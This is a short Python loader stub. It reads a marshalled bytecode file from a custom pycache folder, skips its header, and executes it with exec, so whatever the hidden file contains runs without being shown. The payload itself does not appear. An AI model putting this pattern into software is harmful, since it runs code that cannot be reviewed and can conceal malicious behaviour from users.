
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'OcrOutput_eb1ce664277845e0b0bfd320cef14d41.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
